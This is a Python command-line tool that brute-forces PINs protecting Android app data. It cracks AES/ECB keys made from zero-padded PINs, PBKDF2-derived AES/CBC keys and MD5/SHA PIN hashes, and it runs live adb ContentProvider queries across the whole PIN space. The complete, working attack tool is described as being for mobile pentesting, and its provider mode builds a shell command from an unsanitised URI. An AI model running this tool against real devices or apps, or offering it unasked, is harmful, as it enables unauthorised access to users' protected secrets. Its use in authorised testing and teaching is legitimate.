#!/usr/bin/env python3
"""
PIN/Password Brute-Force Cracker for Android ContentProviders and Crypto

Supports:
- AES/ECB with zero-padded PIN key
- AES/CBC with PBKDF2 key derivation
- MD5/SHA hash comparison
- Direct ContentProvider brute-force via adb

Usage:
  python3 pin_cracker.py --mode aes-ecb --ciphertext <b64> --expected <plaintext> --max-pin 999999
  python3 pin_cracker.py --mode pbkdf2-aes --ciphertext <b64> --salt <b64> --iv <b64> --iterations 10000
  python3 pin_cracker.py --mode hash --hash <hex> --algorithm md5 --max-pin 999999
  python3 pin_cracker.py --mode provider --uri <content_uri> --max-pin 9999

Reference: crypto-key-cracking.md, content-provider-attacks.md
"""

import argparse
import base64
import hashlib
import subprocess
import sys
import time

try:
    from Crypto.Cipher import AES
except ImportError:
    print("[!] PyCryptodome required: pip3 install pycryptodome")
    sys.exit(1)


def generate_key_zero_padded(pin: int, key_size: int = 16) -> bytes:
    """Generate AES key from PIN by zero-padding (most common Android pattern)."""
    key_bytes = bytearray(key_size)
    pin_str = str(pin).encode('utf-8')
    for i in range(min(len(pin_str), key_size)):
        key_bytes[i] = pin_str[i]
    return bytes(key_bytes)


def unpad_pkcs5(data: bytes) -> bytes:
    """Remove PKCS5/PKCS7 padding."""
    pad_len = data[-1]
    if 0 < pad_len <= 16 and all(b == pad_len for b in data[-pad_len:]):
        return data[:-pad_len]
    return None


def crack_aes_ecb(ciphertext_b64: str, expected: str, max_pin: int):
    """Brute-force AES/ECB with zero-padded PIN key."""
    ciphertext = base64.b64decode(ciphertext_b64)
    target = expected.encode('utf-8')

    print(f"[*] Cracking AES/ECB, keyspace 0-{max_pin}, target='{expected}'")
    start = time.time()

    for pin in range(0, max_pin + 1):
        key = generate_key_zero_padded(pin)
        try:
            cipher = AES.new(key, AES.MODE_ECB)
            decrypted = cipher.decrypt(ciphertext)
            unpadded = unpad_pkcs5(decrypted)
            if unpadded == target:
                elapsed = time.time() - start
                print(f"[!] PIN FOUND: {pin}")
                print(f"    Decrypted: {unpadded.decode('utf-8')}")
                print(f"    Time: {elapsed:.2f}s")
                return pin
        except Exception:
            continue

    print(f"[-] Not found in range 0-{max_pin}")
    return None


def crack_pbkdf2_aes(ciphertext_b64: str, salt_b64: str, iv_b64: str,
                     iterations: int, max_pin: int, key_size: int = 32):
    """Brute-force AES/CBC with PBKDF2 key derivation from PIN."""
    encrypted = base64.b64decode(ciphertext_b64)
    salt = base64.b64decode(salt_b64)
    iv = base64.b64decode(iv_b64)

    print(f"[*] Cracking PBKDF2+AES/CBC, keyspace 0-{max_pin}, iterations={iterations}")
    start = time.time()

    for i in range(max_pin + 1):
        pin = f'{i:04d}' if max_pin <= 9999 else str(i)
        key = hashlib.pbkdf2_hmac('sha1', pin.encode(), salt, iterations, key_size)
        try:
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted)
            unpadded = unpad_pkcs5(decrypted)
            if unpadded is not None:
                try:
                    plaintext = unpadded.decode('utf-8')
                    elapsed = time.time() - start
                    print(f"[!] PIN FOUND: {pin}")
                    print(f"    Decrypted: {plaintext}")
                    print(f"    Time: {elapsed:.2f}s")
                    return pin
                except UnicodeDecodeError:
                    continue
        except Exception:
            continue

    print(f"[-] Not found in range 0-{max_pin}")
    return None


def crack_hash(target_hash: str, algorithm: str, max_pin: int):
    """Brute-force hash comparison (MD5, SHA1, SHA256)."""
    target = bytes.fromhex(target_hash)

    print(f"[*] Cracking {algorithm} hash, keyspace 0-{max_pin}")
    start = time.time()

    for pin in range(max_pin + 1):
        h = hashlib.new(algorithm, str(pin).encode()).digest()
        if h == target:
            elapsed = time.time() - start
            print(f"[!] PIN FOUND: {pin}")
            print(f"    Time: {elapsed:.2f}s")
            return pin

    print(f"[-] Not found in range 0-{max_pin}")
    return None


def crack_provider(uri: str, max_pin: int):
    """Brute-force ContentProvider via adb content query."""
    print(f"[*] Brute-forcing ContentProvider: {uri}")
    print(f"[*] Keyspace: 0000-{max_pin:04d}")
    start = time.time()

    for i in range(max_pin + 1):
        pin = f'{i:04d}'
        cmd = f'adb shell content query --uri {uri} --where "pin={pin}"'
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            if "Secret=" in result.stdout or "Row:" in result.stdout:
                if "No result found" not in result.stdout:
                    elapsed = time.time() - start
                    print(f"[!] PIN FOUND: {pin}")
                    print(f"    Response: {result.stdout.strip()}")
                    print(f"    Time: {elapsed:.2f}s")
                    return pin
        except subprocess.TimeoutExpired:
            continue
        except Exception as e:
            print(f"[-] Error at PIN {pin}: {e}")
            continue

    print(f"[-] Not found in range 0000-{max_pin:04d}")
    return None


def main():
    parser = argparse.ArgumentParser(description="PIN/Crypto brute-force cracker for mobile pentesting")
    parser.add_argument('--mode', required=True,
                        choices=['aes-ecb', 'pbkdf2-aes', 'hash', 'provider'],
                        help='Cracking mode')
    parser.add_argument('--ciphertext', help='Base64-encoded ciphertext')
    parser.add_argument('--expected', help='Expected plaintext (for AES-ECB mode)')
    parser.add_argument('--salt', help='Base64-encoded salt (for PBKDF2)')
    parser.add_argument('--iv', help='Base64-encoded IV (for AES-CBC)')
    parser.add_argument('--iterations', type=int, default=10000, help='PBKDF2 iterations')
    parser.add_argument('--hash', help='Target hash in hex')
    parser.add_argument('--algorithm', default='md5', help='Hash algorithm (md5, sha1, sha256)')
    parser.add_argument('--uri', help='ContentProvider URI (for provider mode)')
    parser.add_argument('--max-pin', type=int, default=9999, help='Maximum PIN value to try')
    parser.add_argument('--key-size', type=int, default=32, help='Key size in bytes (for PBKDF2)')

    args = parser.parse_args()

    if args.mode == 'aes-ecb':
        if not args.ciphertext or not args.expected:
            parser.error("aes-ecb mode requires --ciphertext and --expected")
        crack_aes_ecb(args.ciphertext, args.expected, args.max_pin)

    elif args.mode == 'pbkdf2-aes':
        if not args.ciphertext or not args.salt or not args.iv:
            parser.error("pbkdf2-aes mode requires --ciphertext, --salt, and --iv")
        crack_pbkdf2_aes(args.ciphertext, args.salt, args.iv,
                         args.iterations, args.max_pin, args.key_size)

    elif args.mode == 'hash':
        if not args.hash:
            parser.error("hash mode requires --hash")
        crack_hash(args.hash, args.algorithm, args.max_pin)

    elif args.mode == 'provider':
        if not args.uri:
            parser.error("provider mode requires --uri")
        crack_provider(args.uri, args.max_pin)


if __name__ == '__main__':
    main()
